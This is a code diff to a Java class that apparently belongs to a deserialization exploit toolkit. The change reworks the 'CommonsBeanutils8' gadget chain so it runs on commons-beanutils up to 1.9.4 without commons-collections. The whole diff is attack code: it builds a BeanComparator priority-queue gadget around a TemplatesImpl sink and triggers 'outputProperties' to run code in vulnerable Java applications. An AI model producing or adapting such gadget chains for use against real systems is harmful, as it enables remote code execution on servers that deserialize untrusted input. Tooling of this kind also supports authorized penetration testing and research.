@@ -7,13 +7,16 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
+
+import java.util.Comparator;
 
 /**
  * @author Whoopsunix
  * <p>
- * CommonsBeanutilsReverseComparatorCC
+ * CommonsBeanutilsReverseComparatorJDK
  */
-@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.2.1"})
+@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4"})
 @Authors({Authors.Whoopsunix})
 @Sink({Sink.TemplatesImpl})
 public class CommonsBeanutils8 implements ObjectPayload<Object> {
@@ -26,12 +29,13 @@ public class CommonsBeanutils8 implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain(sinkObject, sinksHelper.getCBVersion());
+        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());
 
         return kickOffObject;
     }
 
-    public Object getChain(Object templates, String version) throws Exception {
-        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparatorCC, templates, version);
+    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
+        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparator, version);
+        return BeanComparatorBuilder.queueGadgetMaker(comparator, templates, RanDomUtils.generateRandomString(1), "outputProperties");
     }
 }
